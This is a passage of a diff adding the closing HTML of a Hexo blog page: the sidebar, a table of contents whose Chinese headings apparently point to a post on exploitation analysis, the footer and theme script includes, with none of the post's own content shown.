+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#知识点"><span class="nav-number">2.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析利用方法"><span class="nav-number">3.</span> <span class="nav-text">分析利用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码"><span class="nav-number">4.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
